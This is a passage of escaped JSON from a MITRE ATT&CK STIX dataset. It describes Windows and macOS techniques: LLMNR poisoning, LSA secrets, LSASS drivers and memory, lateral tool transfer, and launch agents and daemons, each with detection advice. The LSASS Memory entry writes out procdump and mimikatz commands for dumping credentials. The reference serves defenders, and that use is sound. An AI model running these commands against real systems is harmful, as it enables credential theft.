[Responder](https://attack.mitre.org/software/S0174). (Citation: GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub Responder)\",\"external_references\":[{\"external_id\":\"T1557.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1557/001\"},{\"description\":\"Wikipedia. (2016, July 7). Link-Local Multicast Name Resolution. Retrieved November 17, 2017.\",\"source_name\":\"Wikipedia LLMNR\",\"url\":\"https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution\"},{\"description\":\"Microsoft. (n.d.). NetBIOS Name Resolution. Retrieved November 17, 2017.\",\"source_name\":\"TechNet NetBIOS\",\"url\":\"https://technet.microsoft.com/library/cc958811.aspx\"},{\"description\":\"Salvati, M. (2017, June 2). Practical guide to NTLM Relaying in 2017 (A.K.A getting a foothold in under 5 minutes). Retrieved February 7, 2019.\",\"source_name\":\"byt3bl33d3r NTLM Relaying\",\"url\":\"https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html\"},{\"description\":\"Kuehn, E. (2018, April 11). Ever Run a Relay? Why SMB Relays Should Be On Your Mind. Retrieved February 7, 2019.\",\"source_name\":\"Secure Ideas SMB Relay\",\"url\":\"https://blog.secureideas.com/2018/04/ever-run-a-relay-why-smb-relays-should-be-on-your-mind.html\"},{\"description\":\"Nomex. (2014, February 7). NBNSpoof. Retrieved November 17, 2017.\",\"source_name\":\"GitHub NBNSpoof\",\"url\":\"https://github.com/nomex/nbnspoof\"},{\"description\":\"Francois, R. (n.d.). LLMNR Spoofer. Retrieved November 17, 2017.\",\"source_name\":\"Rapid7 LLMNR Spoofer\",\"url\":\"https://www.rapid7.com/db/modules/auxiliary/spoof/llmnr/llmnr_response\"},{\"description\":\"Gaffie, L. (2016, August 25). Responder. Retrieved November 17, 2017.\",\"source_name\":\"GitHub Responder\",\"url\":\"https://github.com/SpiderLabs/Responder\"},{\"description\":\"Sternstein, J. (2013, November). Local Network Attacks: LLMNR and NBT-NS Poisoning. Retrieved November 17, 2017.\",\"source_name\":\"Sternsecurity LLMNR-NBTNS\",\"url\":\"https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning\"},{\"description\":\"Robertson, K. (2016, August 28). Conveigh. Retrieved November 17, 2017.\",\"source_name\":\"GitHub Conveigh\",\"url\":\"https://github.com/Kevin-Robertson/Conveigh\"}],\"id\":\"attack-pattern--650c784b-7504-4df7-ab2c-4ea882384d1e\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"collection\"}],\"modified\":\"2020-03-31T13:54:08.239Z\",\"name\":\"LLMNR/NBT-NS Poisoning and SMB Relay\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Eric Kuehn, Secure Ideas\",\"Matthew Demaske, Adaptforward\"],\"x_mitre_data_sources\":[\"Windows event logs\",\"Windows Registry\",\"Packet capture\",\"Netflow/Enclave netflow\"],\"x_mitre_detection\":\"Monitor <code>HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows NT\\\\DNSClient</code> for changes to the \\\"EnableMulticast\\\" DWORD value. A value of “0” indicates LLMNR is disabled. (Citation: Sternsecurity LLMNR-NBTNS)\\n\\nMonitor for traffic on ports UDP 5355 and UDP 137 if LLMNR/NetBIOS is disabled by security policy.\\n\\nDeploy an LLMNR/NBT-NS spoofing detection tool.(Citation: GitHub Conveigh) Monitoring of Windows event logs for event IDs 4697 and 7045 may help in detecting successful relay techniques.(Citation: Secure Ideas SMB Relay)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-21T16:22:09.493Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts.(Citation: Passcape LSA Secrets)(Citation: Microsoft AD Admin Tier Model)(Citation: Tilbury Windows Credentials) LSA secrets are stored in the registry at <code>HKEY_LOCAL_MACHINE\\\\SECURITY\\\\Policy\\\\Secrets</code>. LSA secrets can also be dumped from memory.(Citation: ired Dumping LSA Secrets)\\n\\n[Reg](https://attack.mitre.org/software/S0075) can be used to extract from the Registry. [Mimikatz](https://attack.mitre.org/software/S0002) can be used to extract secrets from memory.(Citation: ired Dumping LSA Secrets)\",\"external_references\":[{\"external_id\":\"T1003.004\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1003/004\"},{\"description\":\"Passcape. (n.d.). Windows LSA secrets. Retrieved February 21, 2020.\",\"source_name\":\"Passcape LSA Secrets\",\"url\":\"https://www.passcape.com/index.php?section=docsys&cmd=details&id=23\"},{\"description\":\"Microsoft. (2019, February 14). Active Directory administrative tier model. Retrieved February 21, 2020.\",\"source_name\":\"Microsoft AD Admin Tier Model\",\"url\":\"https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material?redirectedfrom=MSDN\"},{\"description\":\"Chad Tilbury. (2017, August 8). 1Windows Credentials: Attack, Mitigation, Defense. Retrieved February 21, 2020.\",\"source_name\":\"Tilbury Windows Credentials\",\"url\":\"https://www.first.org/resources/papers/conf2017/Windows-Credentials-Attacks-and-Mitigation-Techniques.pdf\"},{\"description\":\"Mantvydas Baranauskas. (2019, November 16). Dumping LSA Secrets. Retrieved February 21, 2020.\",\"source_name\":\"ired Dumping LSA Secrets\",\"url\":\"ttps://ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets\"},{\"description\":\"PowerSploit. (n.d.). Retrieved December 4, 2014.\",\"source_name\":\"Powersploit\",\"url\":\"https://github.com/mattifestation/PowerSploit\"}],\"id\":\"attack-pattern--1ecfdab8-7d59-4c98-95d4-dc41970f57fc\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"}],\"modified\":\"2020-03-24T20:35:42.440Z\",\"name\":\"LSA Secrets\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Ed Williams, Trustwave, SpiderLabs\"],\"x_mitre_data_sources\":[\"Process monitoring\",\"PowerShell logs\",\"Process command-line parameters\"],\"x_mitre_detection\":\"Monitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit\'s Invoke-Mimikatz module,(Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"SYSTEM\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2018-01-16T16:13:52.465Z\",\"external_references\":[{\"external_id\":\"T1177\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1177\"},{\"description\":\"Microsoft. (n.d.). Security Subsystem Architecture. Retrieved November 27, 2017.\",\"source_name\":\"Microsoft Security Subsystem\",\"url\":\"https://technet.microsoft.com/library/cc961760.aspx\"},{\"description\":\"Microsoft. (2014, March 12). Configuring Additional LSA Protection. Retrieved November 27, 2017.\",\"source_name\":\"Microsoft LSA Protection Mar 2014\",\"url\":\"https://technet.microsoft.com/library/dn408187.aspx\"},{\"description\":\"Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.\",\"source_name\":\"TechNet Autoruns\",\"url\":\"https://technet.microsoft.com/en-us/sysinternals/bb963902\"},{\"description\":\"Microsoft. (n.d.). Dynamic-Link Library Security. Retrieved November 27, 2017.\",\"source_name\":\"Microsoft DLL Security\",\"url\":\"https://msdn.microsoft.com/library/windows/desktop/ff919712.aspx\"}],\"id\":\"attack-pattern--6e6845c2-347a-4a6f-a2d1-b74a18ebd352\",\"modified\":\"2020-01-24T18:50:28.846Z\",\"name\":\"LSASS Driver\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-24T18:38:55.801Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process. (Citation: Microsoft Security Subsystem)\\n\\nAdversaries may target LSASS drivers to obtain persistence. By either replacing or adding illegitimate drivers (e.g., [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574)), an adversary can use LSA operations to continuously execute malicious payloads.\",\"external_references\":[{\"external_id\":\"T1547.008\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1547/008\"},{\"description\":\"Microsoft. (n.d.). Security Subsystem Architecture. Retrieved November 27, 2017.\",\"source_name\":\"Microsoft Security Subsystem\",\"url\":\"https://technet.microsoft.com/library/cc961760.aspx\"},{\"description\":\"Microsoft. (2014, March 12). Configuring Additional LSA Protection. Retrieved November 27, 2017.\",\"source_name\":\"Microsoft LSA Protection Mar 2014\",\"url\":\"https://technet.microsoft.com/library/dn408187.aspx\"},{\"description\":\"Microsoft. (n.d.). Dynamic-Link Library Security. Retrieved November 27, 2017.\",\"source_name\":\"Microsoft DLL Security\",\"url\":\"https://msdn.microsoft.com/library/windows/desktop/ff919712.aspx\"},{\"description\":\"Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.\",\"source_name\":\"TechNet Autoruns\",\"url\":\"https://technet.microsoft.com/en-us/sysinternals/bb963902\"}],\"id\":\"attack-pattern--f0589bc3-a6ae-425a-a3d5-5659bfee07f4\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-03-25T16:52:26.567Z\",\"name\":\"LSASS Driver\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Vincent Le Toux\"],\"x_mitre_data_sources\":[\"DLL monitoring\",\"File monitoring\",\"Loaded DLLs\",\"Process monitoring\"],\"x_mitre_detection\":\"With LSA Protection enabled, monitor the event logs (Events 3033 and 3063) for failed attempts to load LSA plug-ins and drivers. (Citation: Microsoft LSA Protection Mar 2014) Also monitor DLL load operations in lsass.exe. (Citation: Microsoft DLL Security)\\n\\nUtilize the Sysinternals Autoruns/Autorunsc utility (Citation: TechNet Autoruns) to examine loaded drivers associated with the LSA. \",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"SYSTEM\",\"Administrator\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-11T18:41:44.783Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550).\\n\\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\\n\\nFor example, on the target host use procdump:\\n\\n* <code>procdump -ma lsass.exe lsass_dump</code>\\n\\nLocally, mimikatz can be run using:\\n\\n* <code>sekurlsa::Minidump lsassdump.dmp</code>\\n* <code>sekurlsa::logonPasswords</code>\\n\\n\\nWindows Security Support Provider (SSP) DLLs are loaded into LSSAS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user\'s Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\Security Packages</code> and <code>HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\OSConfig\\\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)\\n\\nThe following SSPs can be used to access credentials:\\n\\n* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\\n* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation: TechNet Blogs Credential Protection)\\n* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\\n* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.(Citation: TechNet Blogs Credential Protection)\\n\",\"external_references\":[{\"external_id\":\"T1003.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1003/001\"},{\"description\":\"Graeber, M. (2014, October). Analysis of Malicious Security Support Provider DLLs. Retrieved March 1, 2017.\",\"source_name\":\"Graeber 2014\",\"url\":\"http://docplayer.net/20839173-Analysis-of-malicious-security-support-provider-dlls.html\"},{\"description\":\"Wilson, B. (2016, April 18). The Importance of KB2871997 and KB2928120 for Credential Protection. Retrieved April 11, 2018.\",\"source_name\":\"TechNet Blogs Credential Protection\",\"url\":\"https://blogs.technet.microsoft.com/askpfeplat/2016/04/18/the-importance-of-kb2871997-and-kb2928120-for-credential-protection/\"},{\"description\":\"French, D. (2018, October 2). Detecting Attempts to Steal Passwords from Memory. Retrieved October 11, 2019.\",\"source_name\":\"Medium Detecting Attempts to Steal Passwords from Memory\",\"url\":\"https://medium.com/threatpunter/detecting-attempts-to-steal-passwords-from-memory-558f16dce4ea\"},{\"description\":\"PowerSploit. (n.d.). Retrieved December 4, 2014.\",\"source_name\":\"Powersploit\",\"url\":\"https://github.com/mattifestation/PowerSploit\"}],\"id\":\"attack-pattern--65f2d882-3f41-4d48-8a06-29af77ec9f90\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"}],\"modified\":\"2020-06-09T20:46:00.393Z\",\"name\":\"LSASS Memory\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Ed Williams, Trustwave, SpiderLabs\"],\"x_mitre_data_sources\":[\"Process command-line parameters\",\"PowerShell logs\",\"Process monitoring\"],\"x_mitre_detection\":\"Monitor for unexpected processes interacting with LSASS.exe.(Citation: Medium Detecting Attempts to Steal Passwords from Memory) Common credential dumpers such as Mimikatz access LSASS.exe by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [Process Injection](https://attack.mitre.org/techniques/T1055) to reduce potential indicators of malicious activity.\\n\\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\\n\\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit\'s Invoke-Mimikatz module,(Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-03-11T21:01:00.959Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may transfer tools or other files between systems in a compromised environment. Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Adversaries may copy files laterally between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over SMB to connected network shares or with authenticated connections with [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) or [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001). Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.\",\"external_references\":[{\"external_id\":\"T1570\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1570\"}],\"id\":\"attack-pattern--bf90d72c-c00b-45e3-b3aa-68560560d4c5\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"lateral-movement\"}],\"modified\":\"2020-03-23T22:10:10.862Z\",\"name\":\"Lateral Tool Transfer\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process command-line parameters\",\"File monitoring\",\"Packet capture\",\"Process use of network\",\"Netflow/Enclave netflow\",\"Network protocol analysis\",\"Process monitoring\"],\"x_mitre_detection\":\"Monitor for file creation and files transferred within a network using protocols such as SMB. Unusual processes with internal network connections creating files on-system may be suspicious. Consider monitoring for abnormal usage of utilities and command-line arguments that may be used in support of remote transfer of files. Considering monitoring for alike file hashes or characteristics (ex: filename) that are created on multiple hosts.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-12-14T16:46:06.044Z\",\"external_references\":[{\"external_id\":\"T1159\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1159\"},{\"description\":\"Apple. (n.d.). Creating Launch Daemons and Agents. Retrieved July 10, 2017.\",\"source_name\":\"AppleDocs Launch Agent Daemons\",\"url\":\"https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html\"},{\"description\":\"Marc-Etienne M.Leveille. (2016, July 6). New OSX/Keydnap malware is hungry for credentials. Retrieved July 3, 2017.\",\"source_name\":\"OSX Keydnap malware\",\"url\":\"https://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/\"},{\"description\":\"Thomas Reed. (2017, January 18). New Mac backdoor using antiquated code. Retrieved July 5, 2017.\",\"source_name\":\"Antiquated Mac Malware\",\"url\":\"https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/\"},{\"description\":\"Thomas Reed. (2017, July 7). New OSX.Dok malware intercepts web traffic. Retrieved July 10, 2017.\",\"source_name\":\"OSX.Dok Malware\",\"url\":\"https://blog.malwarebytes.com/threat-analysis/2017/04/new-osx-dok-malware-intercepts-web-traffic/\"},{\"description\":\"Dani Creus, Tyler Halfpop, Robert Falcone. (2016, September 26). Sofacy\'s \'Komplex\' OS X Trojan. Retrieved July 8, 2017.\",\"source_name\":\"Sofacy Komplex Trojan\",\"url\":\"https://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/\"},{\"description\":\"Patrick Wardle. (2014, September). Methods of Malware Persistence on Mac OS X. Retrieved July 5, 2017.\",\"source_name\":\"Methods of Mac Malware Persistence\",\"url\":\"https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf\"},{\"description\":\"Patrick Wardle. (2016, February 29). Let\'s Play Doctor: Practical OS X Malware Detection & Analysis. Retrieved July 10, 2017.\",\"source_name\":\"OSX Malware Detection\",\"url\":\"https://www.synack.com/wp-content/uploads/2016/03/RSA_OSX_Malware.pdf\"},{\"description\":\"Eddie Lee. (2016, February 17). OceanLotus for OS X - an Application Bundle Pretending to be an Adobe Flash Update. Retrieved July 5, 2017.\",\"source_name\":\"OceanLotus for OS X\",\"url\":\"https://www.alienvault.com/blogs/labs-research/oceanlotus-for-os-x-an-application-bundle-pretending-to-be-an-adobe-flash-update\"}],\"id\":\"attack-pattern--dd901512-6e37-4155-943b-453e3777b125\",\"modified\":\"2020-01-17T16:52:35.818Z\",\"name\":\"Launch Agent\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-17T16:10:58.592Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence. Per Apple’s developer documentation, when a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (plist) files found in <code>/System/Library/LaunchAgents</code>, <code>/Library/LaunchAgents</code>, and <code>$HOME/Library/LaunchAgents</code> (Citation: AppleDocs Launch Agent Daemons) (Citation: OSX Keydnap malware) (Citation: Antiquated Mac Malware). These launch agents have property list files which point to the executables that will be launched (Citation: OSX.Dok Malware).\\n \\nAdversaries may install a new launch agent that can be configured to execute at login by using launchd or launchctl to load a plist into the appropriate directories  (Citation: Sofacy Komplex Trojan)  (Citation: Methods of Mac Malware Persistence). The agent name may be disguised by using a name from a related operating system or benign software. Launch Agents are created with user level privileges and are executed with the privileges of the user when they log in (Citation: OSX Malware Detection) (Citation: OceanLotus for OS X). They can be set up to execute when a specific user logs in (in the specific user’s directory structure) or when any user logs in (which requires administrator privileges).\",\"external_references\":[{\"external_id\":\"T1543.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1543/001\"},{\"description\":\"Apple. (n.d.). Creating Launch Daemons and Agents. Retrieved July 10, 2017.\",\"source_name\":\"AppleDocs Launch Agent Daemons\",\"url\":\"https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html\"},{\"description\":\"Marc-Etienne M.Leveille. (2016, July 6). New OSX/Keydnap malware is hungry for credentials. Retrieved July 3, 2017.\",\"source_name\":\"OSX Keydnap malware\",\"url\":\"https://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/\"},{\"description\":\"Thomas Reed. (2017, January 18). New Mac backdoor using antiquated code. Retrieved July 5, 2017.\",\"source_name\":\"Antiquated Mac Malware\",\"url\":\"https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/\"},{\"description\":\"Thomas Reed. (2017, July 7). New OSX.Dok malware intercepts web traffic. Retrieved July 10, 2017.\",\"source_name\":\"OSX.Dok Malware\",\"url\":\"https://blog.malwarebytes.com/threat-analysis/2017/04/new-osx-dok-malware-intercepts-web-traffic/\"},{\"description\":\"Dani Creus, Tyler Halfpop, Robert Falcone. (2016, September 26). Sofacy\'s \'Komplex\' OS X Trojan. Retrieved July 8, 2017.\",\"source_name\":\"Sofacy Komplex Trojan\",\"url\":\"https://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/\"},{\"description\":\"Patrick Wardle. (2014, September). Methods of Malware Persistence on Mac OS X. Retrieved July 5, 2017.\",\"source_name\":\"Methods of Mac Malware Persistence\",\"url\":\"https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf\"},{\"description\":\"Patrick Wardle. (2016, February 29). Let\'s Play Doctor: Practical OS X Malware Detection & Analysis. Retrieved July 10, 2017.\",\"source_name\":\"OSX Malware Detection\",\"url\":\"https://www.synack.com/wp-content/uploads/2016/03/RSA_OSX_Malware.pdf\"},{\"description\":\"Eddie Lee. (2016, February 17). OceanLotus for OS X - an Application Bundle Pretending to be an Adobe Flash Update. Retrieved July 5, 2017.\",\"source_name\":\"OceanLotus for OS X\",\"url\":\"https://www.alienvault.com/blogs/labs-research/oceanlotus-for-os-x-an-application-bundle-pretending-to-be-an-adobe-flash-update\"}],\"id\":\"attack-pattern--d10cbd34-42e3-45c0-84d2-535a09849584\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-03-25T22:11:45.513Z\",\"name\":\"Launch Agent\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\",\"File monitoring\"],\"x_mitre_detection\":\"Monitor Launch Agent creation through additional plist files and utilities such as Objective-See’s  KnockKnock application. Launch Agents also require files on disk for persistence which can also be monitored via other file monitoring applications.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\",\"User\"],\"x_mitre_platforms\":[\"macOS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-12-14T16:46:06.044Z\",\"external_references\":[{\"external_id\":\"T1160\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1160\"},{\"description\":\"Apple. (n.d.). Creating Launch Daemons and Agents. Retrieved July 10, 2017.\",\"source_name\":\"AppleDocs Launch Agent Daemons\",\"url\":\"https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html\"},{\"description\":\"Patrick Wardle. (2014, September). Methods of Malware Persistence on Mac OS X. Retrieved July 5, 2017.\",\"source_name\":\"Methods of Mac Malware Persistence\",\"url\":\"https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf\"},{\"description\":\"Patrick Wardle. (2016, February 29). Let\'s Play Doctor: Practical OS X Malware Detection & Analysis. Retrieved July 10, 2017.\",\"source_name\":\"OSX Malware Detection\",\"url\":\"https://www.synack.com/wp-content/uploads/2016/03/RSA_OSX_Malware.pdf\"},{\"description\":\"Claud Xiao. (n.d.). WireLurker: A New Era in iOS and OS X Malware. Retrieved July 10, 2017.\",\"source_name\":\"WireLurker\",\"url\":\"https://www.paloaltonetworks.com/content/dam/pan/en_US/assets/pdf/reports/Unit_42/unit42-wirelurker.pdf\"}],\"id\":\"attack-pattern--e99ec083-abdd-48de-ad87-4dbf6f8ba2a4\",\"modified\":\"2020-03-19T15:08:50.043Z\",\"name\":\"Launch Daemon\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-17T19:23:15.227Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may create or modify launch daemons to repeatedly execute malicious payloads as part of persistence. Per Apple’s developer documentation, when macOS and OS X boot up, launchd is run to finish system initialization. This process loads the parameters for each launch-on-demand system-level daemon from the property list (plist) files found in <code>/System/Library/LaunchDaemons</code> and <code>/Library/LaunchDaemons</code> (Citation: AppleDocs Launch Agent Daemons). These LaunchDaemons have property list files which point to the executables that will be launched (Citation: Methods of Mac Malware Persistence). \\n\\nAdversaries may install a new launch daemon that can be configured to execute at startup by using launchd or launchctl to load a plist into the appropriate directories  (Citation: OSX Malware Detection). The daemon name may be disguised by using a name from a related operating system or benign software (Citation: WireLurker). Launch Daemons may be created with administrator privileges, but are executed under root privileges, so an adversary may also use a service to escalate privileges from administrator to root. \\n\\nThe plist file permissions must be root:wheel, but the script or program that it points to has no such requirement. So, it is possible for poor configurations to allow an adversary to modify a current Launch Daemon’s executable and gain persistence or Privilege Escalation. \",\"external_references\":[{\"external_id\":\"T1543.004\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1543/004\"},{\"description\":\"Apple. (n.d.). Creating Launch Daemons and Agents. Retrieved July 10, 2017.\",\"source_name\":\"AppleDocs Launch Agent Daemons\",\"url\":\"https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html\"},{\"description\":\"Patrick Wardle. (2014, September). Methods of Malware Persistence on Mac OS X. Retrieved July 5, 2017.\",\"source_name\":\"Methods of Mac Malware Persistence\",\"url\":\"https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf\"},{\"description\":\"Patrick Wardle. (2016, February 29). Let\'s Play Doctor: Practical OS X Malware Detection & Analysis. Retrieved July 10, 2017.\",\"source_name\":\"OSX Malware Detection\",\"url\":\"https://www.synack.com/wp-content/uploads/2016/03/RSA_OSX_Malware.pdf\"},{\"description\":\"Claud Xiao. (n.d.). WireLurker: A New Era in iOS and OS X Malware. Retrieved July 10, 2017.\",\"source_name\":\"WireLurker\",\"url\":\"https://www.paloaltonetworks.com/content/dam/pan/en_US/assets/pdf/reports/Unit_42/unit42-wirelurker.pdf\"}],\"id\":\"attack-pattern--573ad264-1371-4ae0-8482-d2673b719dba\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-03-25T22:27:49.609Z\",\"name\":\"Launch Daemon\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"File monitoring\"],\"x_mitre_detection\":\"Monitor for launch daemon creation or modification through plist files and utilities such as Objective-See\'s KnockKnock application. \",\"x_mitre_effective_permissions\":[\"root\"],\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\"],\"x_mitre_platforms\":[\"macOS\"],\"x_mitre_version\":\"1.0\"}",
